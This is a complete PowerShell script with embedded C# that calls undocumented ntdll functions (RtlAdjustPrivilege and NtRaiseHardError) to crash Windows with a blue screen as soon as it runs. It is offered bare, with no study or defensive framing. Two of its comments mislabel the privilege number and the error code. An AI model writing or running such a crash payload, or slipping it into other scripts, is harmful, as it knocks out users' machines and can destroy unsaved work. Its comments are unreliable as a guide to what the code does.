Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Crash {
    [DllImport("ntdll.dll")]
    public static extern void RtlAdjustPrivilege(UInt32 Privilege, Boolean Enable, Boolean Client, out Boolean Enabled);

    [DllImport("ntdll.dll")]
    public static extern void NtRaiseHardError(Int32 ErrorStatus, UInt32 NumberOfParameters, UInt32 UnicodeStringParameterMask, IntPtr Parameters, Int32 ValidResponseIndex, out Int32 Response);

    public static void TriggerBSOD() {
        Boolean PrivilegeEnabled;
        RtlAdjustPrivilege(19, true, false, out PrivilegeEnabled); // SE_DEBUG_NAME privilege
        Int32 Response;
        NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out Response); // STATUS_FATAL_APP_EXIT
    }
}
"@ -Language CSharp
[Crash]::TriggerBSOD()
